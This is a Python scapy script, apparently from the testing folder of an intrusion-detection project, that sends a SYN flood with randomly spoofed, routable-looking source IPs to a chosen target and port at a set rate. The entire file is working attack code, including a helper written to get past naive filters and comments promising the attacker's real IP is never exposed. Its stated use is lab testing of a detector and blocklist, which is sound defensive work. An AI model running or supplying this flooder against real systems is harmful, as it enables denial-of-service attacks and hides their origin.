#!/usr/bin/env python3
"""
spoofed_syn_flood.py — SYN Flood Attacker with RANDOM SPOOFED Source IPs.
Runs on Windows (Git Bash / Python + Npcap) OR WSL OR Linux attacker.

ATTACKER SIDE (Windows host / WSL):
    # Python with SCAPY + Npcap (for Windows raw socket) OR Linux root
    sudo python3 scripts/testing/spoofed_syn_flood.py \
        --target 192.168.1.123 \
        --port 80 \
        --pps 500 \
        --duration 20

SECURITY: Uses 100% RANDOM fake source IPs (1-223.x.x.x except RFC1918).
IP asli Windows ANDA TIDAK AKAN PERNAH terpakai sebagai SUMBER serangan ->
SAGEDRAL-ML nftables blocklist hanya akan berisi IP FAKE, IP host AMAN.
"""
import argparse
import random
import sys
import time

try:
    from scapy.all import IP, TCP, send, RandShort, conf
except ImportError:
    print("[FATAL] scapy not installed. Run: pip install scapy")
    print("   Windows also requires Npcap from https://npcap.com/ (WinPcap compatible)")
    sys.exit(1)

conf.verb = 0


def _random_spoofed_src_ip() -> str:
    """Generate a globally routable-looking random spoofed IPv4.
    Avoids 127.x, 10.x, 172.16-31.x, 192.168.x, 169.254.x, 0.x, 224-255.x
    so it doesn't look obviously bogus to naive filters.
    """
    while True:
        a = random.randint(1, 223)
        if a in (10, 127, 169, 192):
            continue
        b = random.randint(0, 255)
        if a == 172 and 16 <= b <= 31:
            continue
        if a == 192 and b == 168:
            continue
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"


def syn_flood(target_ip: str, target_port: int, pps: int, duration: int, unique_src_count: int = 1000) -> None:
    print("=" * 70)
    print(f"  SPOOFED SYN FLOOD — Target: {target_ip}:{target_port}")
    print(f"  Rate: ~{pps} pkt/s | Duration: {duration}s | Source IPs: ~{unique_src_count} RANDOM SPOOFED")
    print(f"  SAFETY: Your real host IP is NEVER used as source IP.")
    print("=" * 70)

    # Pre-generate a pool of spoofed source IPs for speed
    src_pool = [_random_spoofed_src_ip() for _ in range(unique_src_count)]
    print(f"[+] Generated {len(src_pool)} unique spoofed source IPs.")
    print(f"    Example fake IPs: {src_pool[:3]} ... (all different from YOUR host IP)")
    print(f"[+] Starting in 3s — press Ctrl+C to stop early.")
    time.sleep(3)

    sent = 0
    interval = 1.0 / max(pps, 1)
    end_ts = time.time() + duration
    last_report = time.time()
    report_every_s = 2.0

    try:
        while time.time() < end_ts:
            src_ip = random.choice(src_pool)
            sport = random.randint(1024, 65535)
            seq = random.randint(1000, 0xFFFFFFFF)
            # SYN only (TCP flags = S), window size typical for scan/flood
            pkt = IP(src=src_ip, dst=target_ip) / TCP(
                sport=sport, dport=target_port,
                flags="S", seq=seq, window=65535
            )
            send(pkt, verbose=0)
            sent += 1
            time.sleep(interval)

            if time.time() - last_report >= report_every_s:
                elapsed = max(0.001, (time.time() - (end_ts - duration)))
                print(f"  [+] Sent {sent} SYN packets | avg rate {sent/elapsed:.1f} pkt/s | last src={src_ip}")
                last_report = time.time()

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    print("-" * 70)
    elapsed = max(0.001, (time.time() - (end_ts - duration)))
    print(f"[DONE] Total SYN packets sent: {sent}")
    print(f"       Elapsed: {elapsed:.1f}s | Effective rate: {sent/elapsed:.1f} pkt/s")
    print(f"       All packets had SPOOFED source IPs (not your real IP) ✅")
    print(f"\n👉 Now check in BackBox SAGEDRAL-ML VM:")
    print(f"   - Dashboard Alerts tab -> anomaly_score spike, attack class = DDoS/DoS")
    print(f"   - CLI: sagedral-ml alerts list --limit 20")
    print(f"   - CLI: sudo nft list set inet sagedral blocklist")
    print(f"     -> Blocklist akan berisi IP FAKE SPOOFED di atas, BUKAN IP host Anda")


def main():
    p = argparse.ArgumentParser(description="SYN Flood with SPOOFED random source IPs (safe for your real IP)")
    p.add_argument("--target", "-t", required=True, help="Target BackBox VM IP (bridged interface, e.g. 192.168.1.123)")
    p.add_argument("--port", "-p", type=int, default=80, help="Target port (default: 80, open or closed both work for detection)")
    p.add_argument("--pps", type=int, default=300, help="Packets per second (default: 300)")
    p.add_argument("--duration", "-d", type=int, default=15, help="Duration in seconds (default: 15)")
    p.add_argument("--src-count", type=int, default=1000, help="Number of unique spoofed source IPs (default: 1000)")
    args = p.parse_args()
    syn_flood(args.target, args.port, args.pps, args.duration, args.src_count)


if __name__ == "__main__":
    main()
